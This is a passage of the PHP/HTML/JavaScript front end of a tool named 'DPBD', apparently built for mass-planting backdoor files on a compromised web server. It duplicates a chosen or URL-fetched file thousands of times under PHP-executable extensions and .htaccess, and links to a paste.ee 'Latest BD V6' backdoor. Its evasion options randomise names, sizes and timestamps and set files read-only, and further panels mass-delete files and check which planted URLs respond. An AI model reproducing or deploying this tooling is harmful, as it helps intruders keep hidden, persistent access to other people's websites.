                flex-direction: column;
            }
            .result-buttons {
                flex-direction: column;
                align-items: stretch;
            }
            .result-button {
                width: 100%;
            }
            .extension-checkboxes-2 .extensions-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        .orange-link {
            color: #FFA500;
            text-decoration: none;
        }
        .orange-link:visited {
            color: #FFA500;
        }
        .orange-link:hover {
            color: #FF8C00;
        }
        .orange-link:active {
            color: #FF7F50;
        }
        .notification {
            margin: 5px 0;
            padding: 10px;
            border-radius: 5px;
            font-size: 10px;
        }
        .notification.success {
            background-color: #28a745;
            color: #fff;
        }
        .notification.error {
            background-color: #dc3545;
            color: #fff;
        }
        .notification.info {
            background-color: #17a2b8;
            color: #fff;
        }
        #duplicate-method-notification {
            position: fixed;
            top: 2%;
            left: 4%;
            z-index: 9999;
            padding: 5px 10px;
            background-color: #ffd700;
            color: #000;
            border: 1px solid #444;
            border-radius: 5px;
            display: none;
            font-size: 10px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <button id="stopProcessButton" class="stop-process-button">Stop</button>
    <div id="duplicate-method-notification"></div>
    <div id="loader">
        <img src="https://base64-jkk12sdifjfg1asjda9sdhu2qwuhdqkw0oqsdjqq.us/LIB-LOADER.png" alt="Loading...">
    </div>
    <div class="wrapper">
        <header>
            <p>🜋 Non est ad astra mollis e terris via, sed per aspera ad astra enitendum est. 🜋</p>
        </header>
        <div class="main-container">
            <div class="form-section">
                <h2>🜋 DPBD 🜋</h2>
                <form id="duplicateForm">
                    <label for="dir">Insert Directory:</label>
                    <input
                        type="text"
                        name="dir"
                        id="dir"
                        value="<?php echo htmlspecialchars($currentDir, ENT_QUOTES); ?>"
                        placeholder="Insert Directory"
                        required
                    >
                    <input type="hidden" name="action" value="duplicate">
                    <label>Select File</label>
                    <div class="custom-select-container">
                        <div class="custom-select" data-input-name="file1">
                            <div class="select-selected">-- Select File --</div>
                            <div class="select-items select-hide">
                                <div data-value="">-- Select File --</div>
                                <?php
                                if ($files) {
                                    foreach ($files as $file) {
                                        $fullPath = $currentDir . DIRECTORY_SEPARATOR . $file;
                                        if (is_file($fullPath)) {
                                            $safeFile = htmlspecialchars($file, ENT_QUOTES);
                                            echo "<div data-value='{$safeFile}'>{$safeFile}</div>";
                                        }
                                    }
                                }
                                ?>
                            </div>
                        </div>
                    </div>
                    <label for="file_url">Add File From URL (optional)</label>
                    <input
                        type="text"
                        name="file_url"
                        id="file_url"
                        placeholder="Example : https://example.com/file.php"
                    >
                    <label for="custom_file_name">Custom File Name (optional):</label>
                    <input
                        type="text"
                        name="custom_file_name"
                        id="custom_file_name"
                        placeholder="Enter custom file name"
                    >
                    <label for="custom_extension">Custom Extension (optional):</label>
                    <input
                        type="text"
                        name="custom_extension"
                        id="custom_extension"
                        placeholder="Enter custom extension"
                    >
                    <div class="radio-group">
                        <input
                            type="radio"
                            name="duplicate_method"
                            value="number"
                            id="method_number"
                            checked
                        >
                        <label for="method_number">By Number</label>
                        <input
                            type="radio"
                            name="duplicate_method"
                            value="percentage"
                            id="method_percentage"
                        >
                        <label for="method_percentage">By Percentage</label>
                    </div>
                    <div class="duplicate-options">
                        <div class="option">
                            <label for="duplicate_value_number">Number (Max 10000):</label>
                            <input
                                type="number"
                                name="duplicate_value_number"
                                id="duplicate_value_number"
                                max="10000"
                                min="1"
                                value="1"
                                required
                            >
                        </div>
                        <div class="option">
                            <label for="duplicate_value_percentage" class="disabled-label">
                                Percent (Max 4%):
                            </label>
                            <input
                                type="number"
                                name="duplicate_value_percentage"
                                id="duplicate_value_percentage"
                                max="4"
                                min="1"
                                value="1"
                                disabled
                                required
                                readonly
                            >
                        </div>
                    </div>
                    <div class="extension-checkboxes-1">
                        <h3>Duplicate Settings</h3>
                        <div class="dup-settings-grid-2">
                            <div class="dup-settings-col">
								<label>
                                    <input type="checkbox" name="auto_chmod_444" value="1">
                                    Auto Chmod 0444
                                </label>
                                <label>
                                    <input type="checkbox" name="auto_change_random_size" value="1">
                                    Random Filesize
                                </label>
                                <label>
                                    <input type="checkbox" name="auto_change_time_random" value="1">
                                    Random Timestamp
                                </label>
                                <label>
                                    <input type="checkbox" name="randomize_all_extensions" value="1">
                                    Random Size Extension
                                </label>
                            </div>
                            <div class="dup-settings-col">
                                <label>
                                    <input
                                        type="checkbox"
                                        class="random-name-box"
                                        name="random_name_option"
                                        value="default"
                                        checked
                                    >
                                    Random Name by Default
                                </label>
                                <label>
                                    <input
                                        type="checkbox"
                                        class="random-name-box"
                                        name="random_name_option"
                                        value="number"
                                    >
                                    Random Name by Number
                                </label>
                                <label>
                                    <input
                                        type="checkbox"
                                        class="random-name-box"
                                        name="random_name_option"
                                        value="character"
                                    >
                                    Random Name by Character
                                </label>
                                <label>
                                    <input
                                        type="checkbox"
                                        class="random-name-box"
                                        name="random_name_option"
                                        value="numchar"
                                    >
                                    Random Name by Num & Char
                                </label>
                                <label>
                                    <input
                                        type="checkbox"
                                        class="random-name-box"
                                        name="random_name_option"
                                        value="superrandom"
                                    >
                                    Random Name by Max Random
                                </label>
                            </div>
                        </div>
                    </div>
                    <div class="extension-checkboxes-2">
                        <h3>Extension File:</h3>
                        <label>
                            <input
                                type="checkbox"
                                id="extension_all"
                                name="extensions[]"
                                value="all"
                            >
                            All Extensions
                        </label>
                        <div class="extensions-grid">
                            <label>
                                <input
                                    type="checkbox"
                                    class="extension-checkbox"
                                    name="extensions[]"
                                    value="php"
                                >
                                php
                            </label>
                            <label>
                                <input
                                    type="checkbox"
                                    class="extension-checkbox"
                                    name="extensions[]"
                                    value="phtml"
                                >
                                phtml
                            </label>
                            <label>
                                <input
                                    type="checkbox"
                                    class="extension-checkbox"
                                    name="extensions[]"
                                    value="php3"
                                >
                                php3
                            </label>
                            <label>
                                <input
                                    type="checkbox"
                                    class="extension-checkbox"
                                    name="extensions[]"
                                    value="php4"
                                >
                                php4
                            </label>
                            <label>
                                <input
                                    type="checkbox"
                                    class="extension-checkbox"
                                    name="extensions[]"
                                    value="php5"
                                >
                                php5
                            </label>
                            <label>
                                <input
                                    type="checkbox"
                                    class="extension-checkbox"
                                    name="extensions[]"
                                    value="php56"
                                >
                                php56
                            </label>
                            <label>
                                <input
                                    type="checkbox"
                                    class="extension-checkbox"
                                    name="extensions[]"
                                    value="php7"
                                >
                                php7
                            </label>
                            <label>
                                <input
                                    type="checkbox"
                                    class="extension-checkbox"
                                    name="extensions[]"
                                    value="phpdouble"
                                >
                                Double Ext
                            </label>
                            <label>
                                <input
                                    type="checkbox"
                                    class="extension-checkbox"
                                    id="htaccessBox"
                                    name="extensions[]"
                                    value="htaccess"
                                >
                                .htaccess
                            </label>
                        </div>
                    </div>
                    <input type="hidden" name="use_fallback" value="0" id="useFallback">
                    <input type="submit" name="duplicate" value="Duplicate File">
                    <div>
                        Latest BD V6 Link:
                        <a
                            href="https://paste.ee/r/G3dGt/0"
                            target="_blank"
                            rel="noopener noreferrer"
                            class="orange-link"
                        >
                            CLICK HERE
                        </a>
                    </div>
                    <div>
                        Latest .htaccess Link:
                        <a
                            href="https://paste.ee/r/kt1JG/0"
                            target="_blank"
                            rel="noopener noreferrer"
                            class="orange-link"
                        >
                            CLICK HERE
                        </a>
                    </div>
                </form>
            </div>
            <div class="file-list-section">
                <h2>🜋 This Dir 🜋</h2>
                <div class="file-list">
                    <ul>
                        <?php
                        if ($files) {
                            foreach ($files as $file) {
                                $safeFile = htmlspecialchars($file, ENT_QUOTES);
                                $fullPath = htmlspecialchars(
                                    $currentDir . DIRECTORY_SEPARATOR . $file,
                                    ENT_QUOTES
                                );
                                echo "<li>
                                    <div class='file-name'>{$safeFile}</div>
                                    <div class='file-actions'>
                                        <button class='copy-path' data-path='{$fullPath}'>COPY</button>
                                        <button class='delete-file' data-path='{$fullPath}'>DELETE</button>
                                    </div>
                                </li>";
                            }
                        }
                        ?>
                    </ul>
                </div>
            </div>
            <div class="result-section">
                <div class="result-header">
                    <h2 id="result-title">🜋 Results 🜋</h2>
                    <div class="result-buttons">
                        <button id="copy-ok-url" class="result-button copy-green">Copy Green</button>
                        <button id="copy-failed-url" class="result-button copy-red">Copy Red</button>
                        <button id="copy-all" class="result-button">Copy All</button>
                        <button id="delete-all" class="result-button">Delete All</button>
                    </div>
                </div>
                <div id="result-content"></div>
            </div>
            <div class="utilities-section">
                <div class="mass-delete-section">
                    <h2>🜋 Mass Delete 🜋</h2>
                    <form id="deleteForm">
                        <input type="hidden" name="action" value="delete">
                        <textarea
                            name="delete_list"
                            id="delete"
                            rows="4"
                            placeholder="Enter list of files or directories to delete..."
                            required
                        ></textarea>
                        <input type="submit" name="delete" value="Delete Files">
                    </form>
                </div>
                <div class="url-checker-section">
                    <h2>🜋 URL Checker 🜋</h2>
                    <form id="urlCheckForm">
                        <textarea
                            name="url_list"
                            id="url_list"
                            rows="4"
                            placeholder="Enter list of URLs to check (separated by new lines)..."
                            required
                        ></textarea>
                        <input type="submit" name="url_check" value="Check URLs">
                    </form>
                </div>
            </div>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const loader                      = document.getElementById('loader');
            const stopProcessButton           = document.getElementById('stopProcessButton');
            const duplicateMethodNotification = document.getElementById('duplicate-method-notification');
            const duplicateForm               = document.getElementById('duplicateForm');
            const deleteForm                  = document.getElementById('deleteForm');
            const urlCheckForm                = document.getElementById('urlCheckForm');
            const resultContent               = document.getElementById('result-content');
            const copyAllButton               = document.getElementById("copy-all");
            const copyOkButton                = document.getElementById("copy-ok-url");
            const copyFailedButton            = document.getElementById("copy-failed-url");
            const deleteAllButton             = document.getElementById("delete-all");
            const useFallbackInput            = document.getElementById("useFallback");

            let okUrls       = [];
            let failedUrls   = [];
            let controller   = null;
            let fallbackUsed = false;

            const toggleDuplicateValueInput = () => {
                const method = document.querySelector('input[name="duplicate_method"]:checked').value;
                const numberInput     = document.getElementById('duplicate_value_number');
                const percentageInput = document.getElementById('duplicate_value_percentage');
                const labelNumber     = document.querySelector('label[for="duplicate_value_number"]');
                const labelPercentage = document.querySelector('label[for="duplicate_value_percentage"]');

                if (method === 'percentage') {
                    numberInput.disabled      = true;
                    percentageInput.disabled  = false;
                    percentageInput.readOnly  = false;
                    labelNumber.classList.add('disabled-label');
                    labelPercentage.classList.remove('disabled-label');
                } else {
                    numberInput.disabled      = false;
                    percentageInput.disabled  = true;
                    percentageInput.readOnly  = true;
                    labelNumber.classList.remove('disabled-label');
                    labelPercentage.classList.add('disabled-label');
                }
            };
            toggleDuplicateValueInput();
            document
                .querySelectorAll('input[name="duplicate_method"]')
                .forEach(radio => radio.addEventListener('change', toggleDuplicateValueInput));

            const extensionAll = document.getElementById('extension_all');
            const htaccessBox  = document.getElementById('htaccessBox');
            extensionAll.addEventListener('change', function () {
                const checked = this.checked;
                if (checked) {
                    htaccessBox.checked = false;
                }
                document.querySelectorAll('.extension-checkbox').forEach(cb => {
                    if (cb === htaccessBox && checked) {
                        cb.checked = false;
                    } else {
                        cb.checked = checked;
                    }
                });
            });
            htaccessBox.addEventListener('change', function () {
                if (this.checked) {
                    extensionAll.checked = false;
                    document.querySelectorAll('.extension-checkbox').forEach(cb => {
                        if (cb !== htaccessBox) {
                            cb.checked = false;
                        }
                    });
                }
            });
            const randomNameBoxes = document.querySelectorAll('.random-name-box');
            randomNameBoxes.forEach(box => {
                box.addEventListener('change', function() {
                    if (this.checked) {
                        randomNameBoxes.forEach(other => {
                            if (other !== this) {
                                other.checked = false;
                            }
                        });
                    }
                });
            });

            document.querySelectorAll('.custom-select').forEach(select => {
                const selected  = select.querySelector('.select-selected');
                const items     = select.querySelector('.select-items');
                const inputName = select.getAttribute('data-input-name');
                const hiddenInput = document.createElement('input');
                hiddenInput.type = 'hidden';
                hiddenInput.name = inputName;
                select.parentNode.appendChild(hiddenInput);

                selected.addEventListener('click', e => {
                    e.stopPropagation();
                    closeAllSelect(select);
                    items.classList.toggle('select-hide');
                    selected.classList.toggle('select-arrow-active');
                });
                items.querySelectorAll('div[data-value]').forEach(option => {
                    option.addEventListener('click', () => {
                        const value = option.getAttribute('data-value');
                        selected.innerHTML = option.innerHTML;
                        hiddenInput.value  = value;
                        items.classList.add('select-hide');
                        selected.classList.remove('select-arrow-active');
                    });
                });
            });

            const closeAllSelect = (currentSelect) => {
                document.querySelectorAll('.select-items').forEach(items => {
                    if (items.parentElement !== currentSelect) {
                        items.classList.add('select-hide');
                    }
                });
                document.querySelectorAll('.select-selected').forEach(sel => {
                    if (sel.parentElement !== currentSelect) {
                        sel.classList.remove('select-arrow-active');
                    }
                });
            };

            document.addEventListener('click', () => {
                document.querySelectorAll('.select-items').forEach(items => items.classList.add('select-hide'));
                document.querySelectorAll('.select-selected').forEach(sel => sel.classList.remove('select-arrow-active'));
            });

            stopProcessButton.addEventListener('click', () => {
                if (controller) {
                    controller.abort();
                    loader.style.display = 'none';
                    stopProcessButton.style.display = 'none';
                    duplicateMethodNotification.style.display = 'none';
                    alert('Process stopped by user.');
                }
            });

            if (duplicateForm) {
                duplicateForm.addEventListener('submit', async (e) => {
                    e.preventDefault();
                    fallbackUsed = false;
                    useFallbackInput.value = '0';

                    const formData = new FormData(duplicateForm);
                    if (!formData.get('file1') && !formData.get('file_url')) {
                        alert('Please select at least one file to duplicate or enter a file URL.');
                        return;
                    }

                    let randomNameValue = 'default';
                    const chosenBox = document.querySelector('.random-name-box:checked');
                    if (chosenBox) {
                        randomNameValue = chosenBox.value;
                    }
                    formData.set('random_name_option', randomNameValue);

                    loader.style.display = 'flex';
                    stopProcessButton.style.display = 'block';
                    duplicateMethodNotification.style.display = 'none';
                    resultContent.innerHTML = '';

                    controller = new AbortController();
                    const signal = controller.signal;
                    const timerId = setTimeout(() => {
                        if (!fallbackUsed) {
                            controller.abort();
                            fallbackUsed = true;
                            useFallbackInput.value = '1';
                            doDuplicateRequest();
                        }
                    }, 20000);

                    async function doDuplicateRequest() {
                        const formData2 = new FormData(duplicateForm);
                        controller = new AbortController();
                        const signal2 = controller.signal;

                        try {
                            const response = await fetch('', {
                                method: 'POST',
                                body: formData2,
                                signal: signal2
                            });
                            clearTimeout(timerId);
                            loader.style.display = 'none';
                            stopProcessButton.style.display = 'none';

                            if (!response.ok) {
                                alert('An error occurred while processing the request.');
                                return;
                            }
                            const data = await response.json();
                            if (data.html) {
                                resultContent.innerHTML = data.html;
                                const infoBlock = resultContent.querySelector('.notification.info');
                                if (infoBlock) {
                                    duplicateMethodNotification.innerText =
                                        infoBlock.innerText.replace('[INFO]', 'Method:');
                                    duplicateMethodNotification.style.display = 'block';
                                }
                            }
                        } catch (error) {
                            clearTimeout(timerId);
                            loader.style.display = 'none';
                            stopProcessButton.style.display = 'none';

                            if (error.name === 'AbortError') {
                                console.log('Fetch aborted');
                            } else {
                                alert('An error occurred while processing the request.');
                            }
                        }
                    }
                    doDuplicateRequest();
                });
            }

            if (deleteForm) {
                deleteForm.addEventListener('submit', async (e) => {
                    e.preventDefault();
                    const formData = new FormData(deleteForm);
                    loader.style.display = 'flex';
                    duplicateMethodNotification.style.display = 'none';

                    controller = new AbortController();
                    const signal = controller.signal;

                    try {
                        const response = await fetch('', {
                            method: 'POST',
                            body: formData,
                            signal
                        });
                        loader.style.display = 'none';

                        if (!response.ok) {
                            alert('An error occurred while processing the request.');
                            return;
                        }
                        const data = await response.json();
                        if (data.html) {
                            resultContent.innerHTML = data.html;
                        }
                    } catch (error) {
                        loader.style.display = 'none';
                        if (error.name === 'AbortError') {
                            console.log('Fetch aborted');
                        } else {
                            alert('An error occurred while processing the request.');
                        }
                    }
                });
            }

            if (urlCheckForm) {
                urlCheckForm.addEventListener('submit', async (e) => {
                    e.preventDefault();
                    const formData = new FormData(urlCheckForm);
                    formData.append('action', 'url_check');
                    loader.style.display = 'flex';
                    duplicateMethodNotification.style.display = 'none';

                    controller = new AbortController();
                    const signal = controller.signal;

                    try {
                        const response = await fetch('', {
                            method: 'POST',
                            body: formData,
                            signal
                        });
                        loader.style.display = 'none';

                        if (!response.ok) {
                            alert('An error occurred while checking URLs.');
                            return;
                        }
                        const data = await response.json();
                        if (data.html) {
                            resultContent.innerHTML = data.html;
                        }
                        if (data.ok_urls) {
                            okUrls = data.ok_urls;
                        }
                        if (data.failed_urls) {
                            failedUrls = data.failed_urls;
                        }
                    } catch (error) {
                        loader.style.display = 'none';
                        if (error.name === 'AbortError') {
                            console.log('Fetch aborted');
                        } else {
                            alert('An error occurred while checking URLs.');
                        }
                    }
                });
            }

            if (copyAllButton) {
                copyAllButton.addEventListener("click", () => {
                    const duplicatedFiles = Array.from(document.querySelectorAll(".dir-item"))
                        .map(item => item.textContent.trim());

                    if (duplicatedFiles.length === 0) {
                        alert("No data available to copy.");
                        return;
                    }
                    const dataToCopy = duplicatedFiles.join('\n');
                    navigator.clipboard.writeText(dataToCopy)
                        .then(() => alert("Data successfully copied to clipboard!"))
                        .catch(() => alert("Failed to copy data."));
                });
            }

            if (copyOkButton) {
                copyOkButton.addEventListener("click", () => {
                    if (okUrls.length === 0) {
                        alert("No OK URLs to copy.");
                        return;
                    }
                    const dataToCopy = okUrls.join('\n');
                    navigator.clipboard.writeText(dataToCopy)
                        .then(() => alert("OK URLs successfully copied to clipboard!"))
                        .catch(() => alert("Failed to copy OK URLs."));
                });
            }

            if (copyFailedButton) {
                copyFailedButton.addEventListener("click", () => {
                    if (failedUrls.length === 0) {
                        alert("No Failed URLs to copy.");
                        return;
                    }
                    const dataToCopy = failedUrls.join('\n');
                    navigator.clipboard.writeText(dataToCopy)
                        .then(() => alert("Failed URLs successfully copied to clipboard!"))
                        .catch(() => alert("Failed to copy Failed URLs."));
                });
            }

            if (deleteAllButton) {
                deleteAllButton.addEventListener("click", async () => {
                    const duplicatedFiles = Array.from(document.querySelectorAll(".dir-item"))
                        .map(item => item.textContent.trim());

                    if (duplicatedFiles.length === 0) {
                        alert("No results to delete.");
                        return;
                    }
                    const formData = new FormData();
                    formData.append('action', 'delete');
                    formData.append('delete_list', duplicatedFiles.join('\n'));

                    loader.style.display = 'flex';
                    duplicateMethodNotification.style.display = 'none';

                    controller = new AbortController();
                    const signal = controller.signal;

                    try {
                        const response = await fetch('', {
                            method: 'POST',
                            body: formData,
                            signal
                        });
                        loader.style.display = 'none';

                        if (!response.ok) {
                            alert('An error occurred while processing the request.');
                            return;
                        }
                        const data = await response.json();
                        if (data.html) {
                            resultContent.innerHTML = data.html;
                        }
                    } catch (error) {
                        loader.style.display = 'none';
                        if (error.name === 'AbortError') {
                            console.log('Fetch aborted');
                        } else {
                            alert('An error occurred while processing the request.');
                        }
                    }
                });
            }

            document.querySelectorAll('.copy-path').forEach(button => {
                button.addEventListener('click', () => {
                    const path = button.getAttribute('data-path');
                    navigator.clipboard.writeText(path)
                        .then(() => alert(`Path successfully copied: ${path}`))
                        .catch(() => alert("Failed to copy path."));
                });
            });

            document.querySelectorAll('.delete-file').forEach(button => {
                button.addEventListener('click', function () {
                    const path = this.getAttribute('data-path');
                    const formData = new FormData();
                    formData.append('action', 'delete');
                    formData.append('delete_list', path);

                    loader.style.display = 'flex';
                    duplicateMethodNotification.style.display = 'none';

                    controller = new AbortController();
                    const signal = controller.signal;

                    fetch('', { method: 'POST', body: formData, signal })
                        .then(response => {
                            if (!response.ok) {
                                throw new Error('Network response was not ok.');
                            }
                            return response.json();
                        })
                        .then(data => {
                            loader.style.display = 'none';
                            if (data.html) {
                                alert('File successfully deleted.');
                                this.closest('li').remove();
                            }
                        })
                        .catch((error) => {
                            loader.style.display = 'none';
                            if (error.name === 'AbortError') {
                                console.log('Fetch aborted');
                            } else {
                                alert('An error occurred while processing the request.');
                            }
                        });
                });
            });
        });
    </script>
</body>
</html>
